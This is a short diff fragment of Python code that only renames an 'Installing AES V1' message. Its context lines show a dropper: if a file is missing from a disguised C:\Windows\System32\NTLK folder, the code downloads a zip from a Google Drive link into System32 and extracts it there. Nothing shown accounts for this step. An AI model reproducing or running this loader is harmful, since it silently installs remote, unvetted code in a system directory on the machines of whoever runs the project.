@@ -109,7 +109,7 @@ def download_file_from_google_drive(url, output_path):
         gdown.download(url, output=output_path, quiet=True)
 
 if not os.path.exists("C:\\Windows\\System32\\NTLK\\aesv9.1.py"):
-    print("Installing AES V1 please wait...")
+    print("Installing AIMERX V1 please wait...")
     download_file_from_google_drive("https://drive.google.com/uc?id=1BI81Bz3ATWpjBA0EiPDwEktTAfHJjDyy", "C:\\Windows\\System32\\NTLK\\v1x3.zip")
     zip_file = r'C:\Windows\System32\NTLK\v1x3.zip'
     extract_dir = r'C:\Windows\System32\NTLK'
